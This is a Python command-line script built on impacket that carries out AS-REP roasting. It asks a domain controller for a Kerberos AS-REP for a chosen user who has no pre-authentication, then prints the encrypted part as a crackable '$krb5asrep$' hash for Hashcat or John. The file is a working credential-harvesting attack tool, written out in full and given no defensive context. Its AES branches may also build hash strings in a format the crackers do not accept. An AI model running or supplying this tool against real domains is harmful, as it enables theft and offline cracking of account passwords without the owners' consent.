#!/usr/bin/env python3

import sys
import logging
import datetime
import os
from binascii import hexlify, unhexlify
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.asn1 import AS_REQ, KDCOptions, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive
from pyasn1.codec.der import encoder, decoder
from pyasn1_modules.rfc2459 import AlgorithmIdentifier
from impacket.krb5.asn1 import AS_REP, TGS_REP, METHOD_DATA
from optparse import OptionParser

def getKerberosASREP(username, domain, kdcHost):
    userPrincipal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    asReq = AS_REQ()
    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    kdcOptions = (
        constants.KDCOptions.forwardable.value |
        constants.KDCOptions.renewable.value |
        constants.KDCOptions.proxiable.value
    )

    asReq['req-body']['kdc-options'] = KDCOptions(kdcOptions)
    asReq['req-body']['cname'] = userPrincipal.components_to_asn1
    asReq['req-body']['realm'] = domain.upper()

    asReq['req-body']['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
    asReq['req-body']['sname']['name-string'][0] = 'krbtgt'
    asReq['req-body']['sname']['name-string'][1] = domain.upper()

    now = datetime.datetime.utcnow()
    asReq['req-body']['till'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    asReq['req-body']['rtime'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    asReq['req-body']['nonce'] = int(hexlify(os.urandom(8)), 16)

    # Encryption types to try (RC4 first)
    asReq['req-body']['etype'] = [
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
    ]

    message = encoder.encode(asReq)

    try:
        response = sendReceive(message, domain, kdcHost)
    except Exception as e:
        logging.error("Failed to get AS-REP: %s" % str(e))
        return None

    return response

def parseASREPtoHash(response, username, domain):
    asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

    encPart = asRep['enc-part']

    cipher = encPart['cipher']
    cipher_hex = hexlify(cipher.asOctets()).decode()

    if encPart['etype'] == constants.EncryptionTypes.rc4_hmac.value:
        hash_fmt = "$krb5asrep$23$%s@%s:%s" % (username, domain, cipher_hex)
    elif encPart['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        hash_fmt = "$krb5asrep$18$%s@%s:%s" % (username, domain, cipher_hex)
    elif encPart['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        hash_fmt = "$krb5asrep$17$%s@%s:%s" % (username, domain, cipher_hex)
    else:
        logging.warning("Unsupported encryption type %d" % encPart['etype'])
        return None

    return hash_fmt

if __name__ == '__main__':
    parser = OptionParser()

    parser.add_option("-u", "--user", action="store", help="Single username to target (e.g., 'jdoe')")
    parser.add_option("-d", "--domain", action="store", help="Domain name (e.g., 'corp.local')")
    parser.add_option("--dc-ip", action="store", help="Domain Controller IP or hostname")
    parser.add_option("-v", action="store_true", help="Verbose mode")

    (options, args) = parser.parse_args()

    if options.user is None or options.domain is None or options.dc_ip is None:
        parser.print_help()
        sys.exit(1)

    if options.v:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    username = options.user
    domain = options.domain
    dc_ip = options.dc_ip

    logging.info("Requesting AS-REP for user: %s" % username)

    response = getKerberosASREP(username, domain, dc_ip)

    if response:
        hash_fmt = parseASREPtoHash(response, username, domain)
        if hash_fmt:
            print("\n[+] Hashcat/John AS-REP hash for %s:\n" % username)
            print(hash_fmt)
        else:
            logging.error("Failed to extract AS-REP hash from response.")
    else:
        logging.error("No valid AS-REP returned. Maybe user requires pre-authentication?")
